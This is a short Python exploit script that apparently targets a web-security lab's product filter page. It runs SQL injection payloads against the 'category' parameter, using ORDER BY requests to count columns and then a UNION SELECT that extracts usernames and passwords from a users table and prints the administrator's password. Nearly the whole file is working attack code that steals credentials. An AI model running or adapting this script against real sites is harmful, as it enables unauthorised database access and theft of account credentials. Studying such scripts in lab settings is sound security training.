import sys
import requests
import urllib3
from bs4 import BeautifulSoup   

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_col(url):
    path = "filter?category=Pets"
    for i in range(1, 50):
        payload = "' ORDER BY %s--"%i
        r = requests.get(url+path+payload, verify=False, proxies=proxies)
        res = r.text
        if "Internal Server Error" in res:
            return i-1
        
    return False

def exploit_table (url):
    path = "filter?category=Pets"
    payload = "'UNION SELECT username, password FROM users--"
    r = requests.get(url+path+payload, verify=False, proxies=proxies)
    res = r.text
    if "administrator" in res:
        print("[+] Found administrator password")
        soup = BeautifulSoup(r.text, 'html.parser')
        th_element = soup.find('th', string='administrator')
        td_element = th_element.find_next_sibling('td')
        admin_password = td_element.text
        print("[+] The administrator password is '%s'" % admin_password)
        return True
    return False    




if __name__ == "__main__":
    try:
        url = sys.argv[1]
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("[*] Enumerating columns")
    num_col = exploit_col(url)
    
    if num_col:
        print("[+] Table has " + str(num_col) + "columns")
    else: 
        print("[-] Failed")

    print("[*] Extracting admin credentials")
    if not exploit_table(url):
        print("[-] Unlucky")
